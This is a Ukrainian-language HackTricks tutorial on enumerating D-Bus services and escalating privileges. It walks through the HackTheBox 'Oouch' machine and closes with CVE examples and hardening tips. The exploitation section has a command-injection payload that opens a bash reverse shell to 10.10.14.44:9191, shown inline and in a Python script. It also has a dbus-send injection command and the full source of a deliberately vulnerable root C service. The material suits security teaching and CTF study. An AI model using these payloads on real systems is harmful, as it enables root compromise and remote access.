# Перерахування D-Bus і підвищення привілеїв через ін'єкцію команд

{{#include ../../banners/hacktricks-training.md}}

## **Перерахування через GUI**

D-Bus використовується як посередник міжпроцесної взаємодії (IPC) у desktop-середовищах Ubuntu. В Ubuntu спостерігається одночасна робота кількох message bus: system bus, який переважно використовується **привілейованими службами для надання сервісів, важливих для всієї системи**, і session bus для кожного авторизованого користувача, що надає сервіси, важливі лише для цього конкретного користувача. Основна увага тут приділяється system bus через його зв'язок із сервісами, що працюють із вищими привілеями (наприклад, root), оскільки наша мета — підвищити привілеї. Зазначається, що архітектура D-Bus використовує окремий 'router' для кожного session bus, який відповідає за перенаправлення повідомлень клієнтів до відповідних сервісів на основі адреси, вказаної клієнтами для сервісу, з яким вони хочуть взаємодіяти.<sup>[[1]](#references)</sup>

Сервіси в D-Bus визначаються **об'єктами** та **інтерфейсами**, які вони надають. Об'єкти можна порівняти з екземплярами класів у стандартних OOP-мовах, причому кожен екземпляр однозначно ідентифікується за допомогою **шляху до об'єкта**. Цей шлях, подібно до шляху у файловій системі, однозначно ідентифікує кожен об'єкт, наданий сервісом. Важливим для дослідження є інтерфейс **org.freedesktop.DBus.Introspectable**, який містить єдиний метод — Introspect. Цей метод повертає XML-представлення методів, сигналів і властивостей, які підтримує об'єкт; тут основна увага приділяється методам, а властивості та сигнали не розглядаються.

Для взаємодії з інтерфейсом D-Bus було використано два інструменти: CLI-інструмент **gdbus** для зручного виклику методів, наданих D-Bus, у скриптах, і [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) — GUI-інструмент на основі Python, призначений для перерахування доступних сервісів у кожному bus і відображення об'єктів, що містяться в кожному сервісі.
```bash
sudo apt-get install d-feet
```
Якщо ви перевіряєте **session bus**, спочатку підтвердьте поточну адресу:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

На першому зображенні показано services, зареєстровані в системній шині D-Bus, де **org.debin.apt** спеціально виділено після вибору кнопки System Bus. D-Feet запитує цей service щодо об'єктів, відображаючи interfaces, methods, properties і signals для вибраних об'єктів, як показано на другому зображенні. Також наведено детальний опис signature кожного method.

Важливою функцією є відображення **process ID (pid)** і **command line** service, що корисно для перевірки, чи працює service з підвищеними privileges, що має важливе значення для research relevance.

**D-Feet також дозволяє викликати methods**: користувачі можуть вводити Python expressions як parameters, які D-Feet перетворює на D-Bus types перед передаванням service.

Однак зверніть увагу, що **деякі methods потребують authentication** перед тим, як дозволити нам їх викликати. Ми проігноруємо ці methods, оскільки наша мета — спочатку підвищити privileges без credentials.

Також зверніть увагу, що деякі services запитують інший D-Bus service під назвою org.freedeskto.PolicyKit1, чи слід дозволити користувачеві виконувати певні actions.

## **Enumeration командного рядка**

### Перелік об'єктів Service

Можна перелічити відкриті D-Bus interfaces за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Сервіси, позначені як **`(activatable)`**, є особливо цікавими, оскільки вони **ще не запущені**, але запит до bus може запустити їх на вимогу. Не зупиняйтеся на `busctl list`; зіставте ці імена з фактичними бінарними файлами, які вони виконуватимуть.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Це швидко показує, який шлях `Exec=` буде запущено для активованого імені та від імені якої ідентичності. Якщо бінарний файл або ланцюжок його виконання захищені неналежним чином, неактивна service все одно може стати шляхом до privilege escalation.

#### З'єднання

[З wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Коли процес встановлює з'єднання з bus, bus призначає цьому з'єднанню спеціальне bus name, яке називається _унікальним іменем з'єднання_. Bus names цього типу незмінні — гарантовано, що вони не зміняться, доки існує з'єднання, — і, що важливіше, їх не можна повторно використати протягом усього часу роботи bus. Це означає, що жодне інше з'єднання з цим bus ніколи не матиме такого унікального імені з'єднання, навіть якщо той самий процес закриє з'єднання з bus і створить нове. Унікальні імена з'єднань легко розпізнати, оскільки вони починаються із символу двокрапки, який в інших випадках заборонений.<sup>[[4]](#references)</sup>

### Інформація про Service Object

Після цього можна отримати певну інформацію про interface за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Також зіставте ім’я шини з її `systemd` unit і шляхом до виконуваного файлу:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Це відповідає на практичне питання, яке має значення під час privesc: **якщо виклик методу успішний, який реальний binary і unit виконають дію?**

### Перелік інтерфейсів об’єкта сервісу

Потрібно мати достатні дозволи.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Інспекція інтерфейсу об’єкта служби

Зверніть увагу, що в цьому прикладі було вибрано найновіший виявлений інтерфейс за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (саме він нас цікавить). Літера «s» в інших стовпцях може означати, що очікується string.

Перш ніж пробувати щось небезпечне, спочатку перевірте **read-oriented** або інший метод із низьким ризиком. Це чітко розмежовує три випадки: неправильний синтаксис, метод доступний, але доступ заборонено, або метод доступний і дозволений.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection повідомляє, **що** можна викликати, але не пояснює, **чому** виклик дозволено або заборонено. Для реального privesc triage зазвичай потрібно одночасно перевірити **три рівні**:

1. **Activation metadata** (`.service` files or `SystemdService=`), щоб визначити, який binary і unit фактично буде запущено.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), щоб визначити, хто може виконувати `own`, `send_destination` або `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), щоб визначити модель авторизації за замовчуванням (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Корисні команди:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Не слід припускати відповідність 1:1 між методом D-Bus і дією Polkit. Той самий метод може вибирати іншу дію залежно від об’єкта, який змінюється, або контексту виконання. Тому практичний workflow такий:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` і пошук у відповідних `.policy` файлах
3. live probes із низьким ризиком за допомогою `busctl call`, `gdbus call` або `dbusmap --enable-probes --null-agent`

Proxy або compatibility services заслуговують на особливу увагу. **Proxy, запущений від root**, який пересилає запити до іншого D-Bus service через власне попередньо встановлене з’єднання, може випадково змусити backend вважати, що кожен запит надходить від UID 0, якщо identity початкового caller не перевіряється повторно.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

За наявності достатніх privileges (одних лише `send_destination` і `receive_sender` privileges недостатньо) ви можете **monitor D-Bus communication**.

Щоб **monitor** **communication**, вам знадобляться права **root.** Якщо ви все ще знаходите проблеми, маючи права root, перегляньте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) і [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Якщо ви знаєте, як налаштувати D-Bus config file, щоб **дозволити non-root users sniff** communication, будь ласка, **зв’яжіться зі мною**!

Різні способи monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наведеному нижче прикладі інтерфейс `htb.oouch.Block` відстежується, а **повідомлення "**_**lalalalal**_**" надсилається через непорозуміння**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Ви можете використовувати `capture` замість `monitor`, щоб зберегти результати у файл **pcapng**, який може відкрити Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Фільтрування всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо в шині надто багато інформації, передайте правило відповідності, наприклад:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, повідомлення буде виведено. Наприклад:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Докладнішу інформацію про синтаксис правил зіставлення див. у [документації D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html).<sup>[[7]](#references)</sup>

### Більше

`busctl` має ще більше опцій, [**знайдіть їх усі тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий сценарій**

Як користувач **qtc усередині хоста "oouch" з HTB**, ви можете знайти **неочікуваний конфігураційний файл D-Bus**, розташований у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
З попередньої конфігурації ви знаєте, що **для надсилання й отримання інформації** через це з’єднання D-BUS ви маєте бути користувачем **root** або **www-data**.

Як користувач **qtc** усередині docker container **aeb4525789d8** ви можете знайти код, пов’язаний із dbus, у файлі _/code/oouch/routes.py._ Ось цікавий фрагмент коду:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як бачите, він **підключається до інтерфейсу D-Bus** і надсилає до функції **"Block"** значення "client_ip".

З іншого боку з'єднання D-Bus працює скомпільований бінарний файл C. Цей код **прослуховує** з'єднання D-Bus, **отримуючи IP-адресу, і викликає iptables через функцію `system`**, щоб заблокувати вказану IP-адресу.\
**Виклик `system` навмисно вразливий до command injection**, тому такий payload створить reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Експлуатація

Наприкінці цієї сторінки можна знайти **повний C-код D-Bus application**. У ньому між рядками 91–97 можна побачити, **як зареєстровано `D-Bus object path`** **та `interface name`**. Ця інформація знадобиться для надсилання даних до з'єднання D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також у рядку 57 видно, що **єдиний зареєстрований метод** для цієї комунікації D-Bus називається `Block`(_**Саме тому в наступному розділі payloads надсилатимуться до service object `htb.oouch.Block`, інтерфейсу `/htb/oouch/Block` і методу з назвою `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наведений нижче код на Python надішле payload до D-Bus connection у метод `Block` через `block_iface.Block(runme)` (_зауважте, що його було вилучено з попереднього фрагмента коду_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl і dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` — це інструмент, який використовується для надсилання повідомлень до “Message Bus”.
- Message Bus — програмне забезпечення, яке використовується системами для спрощення комунікації між застосунками. Він пов’язаний із Message Queue (повідомлення впорядковуються в послідовності), але в Message Bus повідомлення надсилаються за моделлю підписки та дуже швидко.
- Прапорець “-system” використовується, щоб зазначити, що це системне повідомлення, а не повідомлення сеансу (типово).
- Прапорець “–print-reply” використовується для належного виведення нашого повідомлення та отримання будь-яких відповідей у форматі, придатному для читання людиною.
- “–dest=Dbus-Interface-Block” — адреса інтерфейсу Dbus.
- “–string:” — тип повідомлення, яке ми хочемо надіслати до інтерфейсу. Існує кілька форматів надсилання повідомлень, як-от double, bytes, booleans, int, objpath. Серед них “object path” корисний, коли потрібно передати шлях до файлу інтерфейсу Dbus. У такому випадку ми можемо використати спеціальний файл (FIFO), щоб передати команду інтерфейсу під виглядом імені файлу. “string:;” — це повторний виклик object path, куди ми поміщаємо FIFO reverse shell файл/команду.

_Зверніть увагу, що в `htb.oouch.Block.Block` перша частина (`htb.oouch.Block`) посилається на service object, а остання частина (`.Block`) посилається на назву методу._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Допоміжні інструменти для автоматизованої Enumeration (2023-2025)

Enumeration великої attack surface D-Bus вручну за допомогою `busctl`/`gdbus` швидко стає обтяжливою. Дві невеликі FOSS-утиліти, випущені протягом останніх кількох років, можуть прискорити роботу під час red-team або CTF-операцій:

### dbusmap ("Nmap for D-Bus")
* Автор: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Написана на C; один статичний binary (<50 kB), який проходить усі object path, отримує XML `Introspect` і визначає PID/UID, що їм відповідає.<sup>[[5]](#references)</sup>
* Корисні flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Інструмент позначає незахищені well-known names символом `!`, миттєво виявляючи services, якими ви можете *оволодіти* (перехопити), або method calls, доступні з shell непривілейованого користувача.

### uptux.py
* Автор: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Скрипт лише на Python, який шукає *writable* paths у systemd units **і** надто permissive D-Bus policy files (наприклад, `send_destination="*"`).<sup>[[6]](#references)</sup>
* Швидке використання:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Модуль D-Bus перевіряє наведені нижче directories і виділяє будь-який service, який може бути spoofed або hijacked звичайним користувачем:
* `/etc/dbus-1/system.d/` і `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Відомі bugs підвищення привілеїв у D-Bus (2024-2025)

Відстеження нещодавно опублікованих CVE допомагає знаходити подібні insecure patterns у custom code. Двома хорошими недавніми прикладами є:<sup>[[2]](#references)[[3]](#references)</sup>

| Рік | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service, що працював від root, надавав D-Bus interface, який непривілейовані користувачі могли переналаштовувати, зокрема завантажувати контрольовану attacker-ом поведінку macros. | Якщо daemon надає **device/profile/config management** у system bus, вважайте writable configuration і macro features примітивами code execution, а не просто "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy, що працював від root, пересилав requests до backend services без збереження security context початкового caller, тому backends довіряли proxy як UID 0. | Розглядайте **proxy / bridge / compatibility** D-Bus services як окремий bug class: якщо вони relay privileged calls, перевіряйте, як caller UID/Polkit context передається до backend. |

Зверніть увагу на такі patterns:
1. Service працює **від root у system bus**.
2. Або **відсутня authorization check**, або check виконується щодо **неправильного subject**.
3. Доступний method зрештою змінює system state: package install, зміни user/group, bootloader config, оновлення device profile, file writes або пряме command execution.

Використовуйте `dbusmap --enable-probes` або ручний `busctl call`, щоб підтвердити доступність method, а потім перевірте policy XML service і Polkit actions, щоб зрозуміти, **який subject** фактично проходить authorization.

---

## Швидкі заходи для Hardening і Detection

* Шукайте world-writable або *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Вимагайте Polkit для небезпечних methods – навіть *root* proxies мають передавати PID *caller* до `polkit_authority_check_authorization_sync()`, а не власний.
* Знижуйте privileges у long-running helpers (використовуйте `sd_pid_get_owner_uid()`, щоб перемикати namespaces після підключення до bus).
* Якщо service неможливо видалити, принаймні *scope* його на dedicated Unix group і обмежте доступ у його XML policy.
* Blue-team: захоплюйте system bus за допомогою `busctl capture > /var/log/dbus_$(date +%F).pcapng` та імпортуйте його у Wireshark для anomaly detection.

---

## References

- [1] [USBCreator D-Bus підвищення привілеїв в Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service дозволяє будь-якому непривілейованому користувачу змінювати configuration](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Обхід Authentication у Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - документація D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
